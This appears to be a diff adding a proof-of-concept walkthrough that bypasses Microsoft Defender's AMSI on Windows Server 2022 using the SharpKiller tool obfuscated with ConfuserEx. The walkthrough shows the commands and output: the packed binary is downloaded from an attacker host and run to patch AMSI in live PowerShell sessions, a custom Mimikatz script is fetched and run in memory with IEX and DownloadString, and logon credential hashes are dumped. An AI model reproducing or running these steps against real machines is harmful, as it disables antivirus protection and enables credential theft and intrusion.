@@ -1,0 +1,166 @@
+===================================================================================================================================================
+AV bypass using the tool 'Sharp-Killer'
+===================================================================================================================================================
+
+Sharp-Killer
+------------
+=> Lifetime AMSI bypass by @ZeroMemoryEx ported to .NET Framework 4.8 
+=> https://github.com/S1lkys/SharpKiller
+
+Notes regarding AV detection
+---------------------------
+Obfuscation is required since the tool is flagged by most antivirus.
+I used the packer "ConfuserEx" to bypass the Microsoft Defender antivirus during my tests.
+
+
+===================================================================================================================================================
+PoC - Test on a Windows 2022 server protected by the Microsoft Defender Antivirus
+===================================================================================================================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Compile the tool "Sharp-Killer" and then obfuscated it (I used the packer "ConfuserEx")
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> Source code:  https://github.com/S1lkys/SharpKiller
+
+=> Packing with ConfuserEX (https://github.com/mkaring/ConfuserEx)
+
+<snip>
+[DEBUG] Executing 'Anti-tamper module writer preparation' phase...
+[DEBUG] Executing 'Anti-debug injection' phase...
+[DEBUG] Executing 'Anti-dump injection' phase...
+[DEBUG] Executing 'Anti-ILDasm marking' phase...
+[DEBUG] Executing 'Encoding reference proxies' phase...
+[DEBUG] Executing 'Constant encryption helpers injection' phase...
+[DEBUG] Executing 'Resource encryption helpers injection' phase...
+[DEBUG] Executing 'Type scrambler' phase...
+[DEBUG] Executing 'Constants encoding' phase...
+[DEBUG] Executing 'Hardening Phase' phase...
+[DEBUG] Executing 'Anti-tamper helpers injection' phase...
+[DEBUG] Executing 'Control flow mangling' phase...
+[DEBUG] Executing 'Post-renaming' phase...
+[DEBUG] Executing 'Anti-tamper metadata preparation' phase...
+[DEBUG] Executing 'Apply watermark' phase...
+[DEBUG] Executing 'Anti-tamper module writer preparation' phase...
+[DEBUG] Executing 'Anti-debug injection' phase...
+[DEBUG] Executing 'Anti-dump injection' phase...
+[DEBUG] Executing 'Anti-ILDasm marking' phase...
+[DEBUG] Executing 'Encoding reference proxies' phase...
+[DEBUG] Executing 'Constant encryption helpers injection' phase...
+[DEBUG] Executing 'Resource encryption helpers injection' phase...
+[DEBUG] Executing 'Type scrambler' phase...
+[DEBUG] Executing 'Constants encoding' phase...
+[DEBUG] Executing 'Hardening Phase' phase...
+[DEBUG] Executing 'Anti-tamper helpers injection' phase...
+[DEBUG] Executing 'Control flow mangling' phase...
+[DEBUG] Executing 'Post-renaming' phase...
+[DEBUG] Executing 'Anti-tamper metadata preparation' phase...
+[DEBUG] Executing 'Apply watermark' phase...
+<SNIP>
+
+=> I renamed the packed version of the tool generated with "ConfuserEX" as "K1ll3r.exe".
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Log into a target Windows server 2022 and start a PowerShell session 
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Microsoft Windows [Version 10.0.20348.3692]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator> powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\Administrator> systeminfo
+
+Host Name:                 SERVER-WIN2022
+OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
+OS Version:                10.0.20348 N/A Build 20348
+OS Manufacturer:           Microsoft Corporation
+<SNIP>
+
+PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled|FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+
+=> Check that the AMSI is working by typing "invoke-mimikatz"
+
+PS C:\Users\Administrator> invoke-mimikatz
+At line:1 char:1
++ invoke-mimikatz
++ ~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute the packed version of "Sharp-Killer" to successfully patch the AMSI.dll in all open PowerShell sessions
+         on the Windows server 2022.
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Temp> wget -URI http://192.168.1.144:8080/K1ll3r.exe -OutFile K1ll3r.exe
+
+PS C:\Temp> .\K1ll3r.exe
+Monitoring for Powershell.exe
+[+] AMSI Patched: 3600
+[+] AMSI Patched: 5228
+<SNIP>
+
+=> The AMSI.dll has been successfully patched for the 2 open PowerShell processes/sessions on the Windows server 2022.
+   To verify it, we can type the command "invoke-mimikatz" that should not been catched anymore by Microsoft Defender.
+   Result : the command is not detected :-) 
+
+PS C:\Users\Administrator> invoke-mimikatz
+The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, 
+or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ invoke-mimikatz
++ ~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Download and execute straight in-memory any PowerShell offensive security scripts or C# offensive security assemblies
+         without being blocked by the Windows Defender AV 
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> We can now download and execute straight in-memory any malicious scripts and tools such as the hacking tool 'Mimikatz' for this PoC.
+
+PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/Invoke-Mimi-Custom.ps1');
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+<SNIP>
+
+Authentication Id : 0 ; 3052411 (00000000:002e937b)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : SERVER-WIN2022
+Logon Server      : SERVER-WIN2022
+Logon Time        : 5/26/2025 11:54:49 AM
+SID               : S-1-5-21-3336774573-1234467604-3718094125-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : SERVER-WIN2022
+         * NTLM     : 6699270562fdbd1e74c7d369<SNIP>
+         * SHA1     : 62c9d420fbebe8aca4f08246<SNIP>
+         * DPAPI    : 62c9d420fbebe8aca4f08246<SNIP>
+<SNIP>
